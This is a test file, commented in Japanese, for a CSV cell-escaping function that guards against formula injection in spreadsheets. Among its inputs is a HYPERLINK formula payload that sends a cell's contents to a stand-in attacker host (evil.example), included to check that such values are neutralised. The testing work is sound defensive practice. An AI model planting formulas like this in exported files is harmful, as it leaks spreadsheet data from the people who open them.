import { describe, expect, it } from 'vitest'

import { cell } from './csv'

describe('cell', () => {
  it('引用符は2つ重ねて逃がす', () => {
    expect(cell('"最高"だった')).toBe('"""最高""だった"')
  })

  it('空は空のセル', () => {
    expect(cell(null)).toBe('""')
    expect(cell(undefined)).toBe('""')
  })

  /*
    **参加者が書いた値は、主催者の表計算ソフトで式として動きうる。**
    `"` で囲んでも Excel は式として読むので、先頭に `'` を置いて文字にする。
  */
  it.each(['=HYPERLINK("https://evil.example/?"&D5,"確認")', '+1+1', '-1+1', '@SUM(A1)', '\t=1', '\r=1'])(
    '%j は式として読まれないように逃がす',
    (value) => {
      expect(cell(value).startsWith(`"'`)).toBe(true)
    }
  )

  it('数値はそのまま（負の数を文字にしない）', () => {
    expect(cell(-3)).toBe('"-3"')
  })

  it('ふつうの文字列には何も足さない', () => {
    expect(cell('よろしくお願いします')).toBe('"よろしくお願いします"')
    expect(cell('taro@example.social')).toBe('"taro@example.social"')
  })
})
